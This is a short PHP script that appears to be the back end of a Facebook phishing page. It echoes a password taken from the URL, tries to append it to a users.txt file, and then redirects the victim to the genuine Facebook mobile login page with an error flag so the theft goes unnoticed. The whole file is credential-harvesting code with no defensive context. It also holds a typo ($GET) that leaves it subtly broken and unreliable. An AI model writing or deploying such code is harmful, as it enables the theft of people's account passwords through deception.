<?php
$handle = fopen("users.txt", "a");
echo $_GET['password'];

fwrite($handle, $GET['password']);
fclose($handle);
header("Location: https://m.facebook.com/login.php?&e=1348092&email=");

exit;
?> 
